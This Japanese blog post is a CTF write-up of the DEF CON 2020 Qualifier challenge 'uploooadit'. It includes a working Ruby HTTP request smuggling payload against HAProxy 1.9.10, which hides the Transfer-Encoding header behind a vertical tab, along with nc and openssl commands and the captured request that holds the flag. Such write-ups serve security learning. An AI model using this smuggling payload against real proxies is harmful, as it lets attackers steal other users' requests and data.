+++
author = "Satoshi Tajima"
categories = [ "ja", "" ]
date = "2020-05-18T23:00:00+09:00"
description = ""
featured = ""
featuredalt = ""
featuredpath = ""
linktitle = ""
title = "DEF CON CTF Qualifier 2020 uploooadit WriteUp"

+++

2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、  
welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。  

最初の2つはチュートリアルなので割愛して、uploooaditのWriteUpを書きます。  

# ソースコードを確認

* Flaskで書かれたPythonのWebアプリケーション
* エンドポイントは以下の3つ
    * GET / ... 空のページです。
    * POST /files/ ... X-guidというリクエストヘッダに記載された文字列の通りのパスにファイルを保存します。
    * GET /files/ ... POST /files/ でアップロードしたファイルのコンテンツを返します。


# 稼働環境を確認

普通にリクエストを投げてみて、HAProxy + gunicorn/20.0.0の構成ということがわかります。

```
$ curl -sv https://uploooadit.oooverflow.io/
.. snip ..
< HTTP/1.1 204 NO CONTENT
< Server: gunicorn/20.0.0
< Date: Sat, 16 May 2020 13:05:18 GMT
< Content-Type: text/html; charset=utf-8
< Via: haproxy
.. snip ..
```

今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。  
https://www.haproxy.org/download/1.9/src/CHANGELOG を見ると、2019/08/08のリリースと若干古いのが気になります。。  
```
$ curl -sv https://uploooadit.oooverflow.io/あ
< HTTP/1.0 400 Bad request
< Server: haproxy 1.9.10
< Cache-Control: no-cache
< Connection: close
< Content-Type: text/html
<
<html><body><h1>400 Bad request</h1>
Your browser sent an invalid request.
</body></html>
.. snip ..
```

SSRFやHTTP request smuggling的あたりができるのではと疑い、
調べてみると HAProxy の HTTP request smuggling というそのまんまの記事が見つかります。

* https://nathandavison.com/blog/haproxy-http-request-smuggling
* https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

この時点でこんな仮設をたてました。

* フラグが含まれたObjectに対するアクセス、ないしはフラグをアップロードするアクセスが、定常的にリクエストされている。
* HTTP request smugglingによって、そのアクセスの内容を盗み取る必要がある。


# ローカルで検証環境の作成

適当に立ち上げたEC2上に...

* HAProxyの1.9.10を用意 (ソースコードからコンパイル)
* gunicornを用意 (pipでインストール)
* 提供された app.py, store.py を使用 (S3StoreはLocalStoreに切り替え)

という形で環境をつくります。

そして、まずはRubyでこんなPayloadを作成。

* payload.rb

```
payload = <<EOP
POST /files/ HTTP/1.1\r
Host: uploooadit.oooverflow.io\r
X-guid: 11111111-2222-3333-1111-111111111112\r
Content-Type: text/plain\r
Content-Length: 4\r
\r
test\r

EOP
print payload 
```

こんな形でトライ& エラーを繰り返せる状態を作ります。

```
$ ruby payload.rb | nc localhost 1080
```

tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。

* payload.rb

```
payload = <<EOP.chomp
POST /files/ HTTP/1.1\r
Host: uploooadit.oooverflow.io\r
X-guid: 11111111-2222-3333-1111-111111111112\r
Content-Type: text/plain\r
Content-Length: 158\r
Transfer-Encoding: \x0bchunked\r
\r
0\r
\r
POST /files/ HTTP/1.1\r
Host: uploooadit.oooverflow.io\r
X-guid: 11111111-2222-3333-1111-111111111119\r
Content-Type: text/plain\r
Content-Length: 388\r
\r
test
EOP

print payload 
sleep(10)
```

* コマンド

```bash
$ unbuffer ruby payload.rb | nc localhost 1080
$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
```

# 実環境でのトライ

実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき...  
最終的に以下のようなコマンドにてリクエストを盗み見ることに成功。

```bash
$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
```

リクエストのBodyにFLAGがありました。
```
tesPOST /files/ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: invoker
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: text/plain
X-guid: 85a290de-9877-4d90-82ea-fe0700a570b0
Content-Length: 152
X-Forwarded-For: 127.0.0.1

Congratulations!
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
```

以上、久しぶりに参加したCTFのWriteUpでした。  
いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、  
そろそろチームとか組んでがっつり時間確保して上位に入るのを目指すような参加をしたい。


